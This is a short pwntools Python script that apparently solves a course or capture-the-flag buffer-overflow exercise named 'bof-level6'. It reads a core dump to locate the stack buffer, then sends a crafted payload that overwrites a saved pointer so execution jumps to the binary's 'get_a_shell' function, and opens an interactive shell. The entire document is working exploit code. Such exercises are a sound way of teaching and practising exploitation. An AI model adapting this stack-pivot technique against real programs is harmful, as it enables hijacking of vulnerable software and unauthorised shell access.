#!/usr/bin/env python

from pwn import *

p = process('./bof-level6')
#Do not care for connecting to gdb for turn in
#gdb.attach(p)

e = ELF('./bof-level6')

get_a_shell = e.symbols['get_a_shell']

print('get_a_shell:')
print(hex(get_a_shell))

buf = "A" * 0x88

#Run this first time to crash the program with the correct buffer allowing second run to work properly
#p.sendline(buf)
#p.wait()

c = Core('./core')

buffer_addr = c.stack.find(buf)
print('buffer_addr:')
print(hex(buffer_addr))

buf = "AAAAAAAA" + p64(get_a_shell) + "A" * 112 + p64(buffer_addr)

print(p.recv())

p.sendline(buf)

p.interactive()
